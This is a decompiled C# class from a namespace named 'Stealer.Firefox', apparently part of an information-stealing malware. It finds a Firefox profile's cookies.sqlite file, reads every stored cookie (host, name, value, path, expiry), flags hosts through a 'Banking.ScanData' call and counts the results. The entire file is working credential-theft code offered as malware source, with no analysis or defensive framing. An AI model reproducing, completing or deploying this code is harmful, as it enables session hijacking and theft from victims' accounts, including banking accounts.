using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.Firefox
{
	// Token: 0x02000028 RID: 40
	internal sealed class cCookies
	{
		// Token: 0x060000BB RID: 187 RVA: 0x00006D30 File Offset: 0x00004F30
		private static string GetCookiesDBPath(string path)
		{
			try
			{
				string path2 = path + "\\Profiles";
				if (Directory.Exists(path2))
				{
					foreach (string str in Directory.GetDirectories(path2))
					{
						if (File.Exists(str + "\\cookies.sqlite"))
						{
							return str + "\\cookies.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00006DA4 File Offset: 0x00004FA4
		public static List<Cookie> Get(string path)
		{
			List<Cookie> list = new List<Cookie>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(cCookies.GetCookiesDBPath(path), "moz_cookies");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Cookie item = default(Cookie);
					item.sHostKey = sqlite.GetValue(i, 4);
					item.sName = sqlite.GetValue(i, 2);
					item.sValue = sqlite.GetValue(i, 3);
					item.sPath = sqlite.GetValue(i, 5);
					item.sExpiresUtc = sqlite.GetValue(i, 6);
					Banking.ScanData(item.sHostKey);
					Counter.Cookies++;
					list.Add(item);
				}
				return list;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return new List<Cookie>();
		}
	}
}
